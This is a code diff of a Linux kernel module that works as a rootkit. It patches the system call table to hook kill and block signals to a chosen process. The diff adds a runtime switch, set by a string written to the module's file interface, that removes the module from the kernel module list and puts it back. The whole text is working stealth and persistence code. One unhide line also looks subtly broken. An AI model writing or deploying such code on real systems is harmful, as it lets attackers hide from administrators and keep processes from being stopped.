@@ -13,6 +13,8 @@ MODULE_LICENSE("GPL");
 char m_name[128] = { 0x0, } ;
 int m_num=0;
 void ** sctable ;
+bool hiding = false;
+struct module *current_mod;
 
 asmlinkage int (*orig_sys_kill)(pid_t pid, int signal) ;
 asmlinkage int m_sys_kill(pid_t pid, int signal) {
@@ -20,7 +22,6 @@ asmlinkage int m_sys_kill(pid_t pid, int signal) {
 		return -1;
 	return orig_sys_kill(pid,signal);
 }
-
 static 
 int m_open(struct inode *inode, struct file *file) {
 	return 0 ;
@@ -64,16 +65,25 @@ ssize_t m_write(struct file *file, const char __user *ubuf, size_t size, loff_t 
 	char m_temp[128] = { 0x0, } ;
 	sscanf(buf,"%128s", m_temp) ;
 
-	/*change type string as integer*/	
-	int res=0;
-	int i;
-
-	for(i = 0; m_temp[i] != '\0'; ++i) {
-		res = res*10 +m_temp[i] - '0';
-
-	}
-	m_num = res;
-	/*  */
+	
+	if(m_temp[0]=='o') { //on , off
+        hiding = !hiding;
+//        struct module *mod = find_module("mexe");
+        
+        if(hiding) {
+            list_del_init(&current_mod->list);
+        } else {
+            list_move_tail(&current_mod->list,&modules->list);
+        }
+	} else { /*change type string as integer*/
+        int res=0;
+        int i;
+        for(i = 0; m_temp[i] != '\0'; ++i) {
+            res = res*10 +m_temp[i] - '0';
+            
+        }
+        m_num = res;
+	}       /*  */
 
 	*offset = strlen(buf) ;
 
@@ -103,11 +113,12 @@ int __init m_init(void) {
 		pte->pte |= _PAGE_RW;
 	sctable[__NR_kill] = m_sys_kill;
 
+    current_mod = &__this_module;
 	/* hiding */
 	
-	struct module *m = &__this_module;
-	if(m->init == m_init)
-		list_del_init(&m->list);
+//    struct module *m = &__this_module;
+//    if(m->init == m_init)
+//        list_del_init(&m->list);
 	
 	/*  */
 
